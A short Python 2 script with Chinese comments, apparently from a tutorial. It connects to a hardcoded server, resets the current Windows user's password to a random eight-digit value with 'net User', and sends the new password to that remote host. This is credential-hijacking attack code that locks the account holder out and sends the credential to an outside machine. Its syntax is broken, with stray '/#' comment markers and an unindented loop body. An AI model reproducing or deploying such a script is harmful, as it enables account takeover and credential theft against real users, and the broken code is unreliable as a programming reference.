# client.py： //文件名
import socket #导入用到的模块
import getpass
import subprocess
import random

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) /#创建socket实例
client.connect(('10.0.0.1', 44444)) /#连接server端IP地址/端口按你自己实际情况来
user = getpass.getuser() /#获取计算机用户名
psd = '' #给一个psd变量（密码）为空
for j in range(1, 9): #生成1-9的随机数
m = str(random.randrange(0, 10))
psd = psd + m
subprocess.Popen(['net', 'User', user, psd]) #在本地执行（类似于cmd命令）
client.send(psd.encode('utf-8')) #将密码发送给server端
back_msg = client.recv(1024)
client.close() #关闭socket
print psd #避免出现差错忘记密码 先在本地打印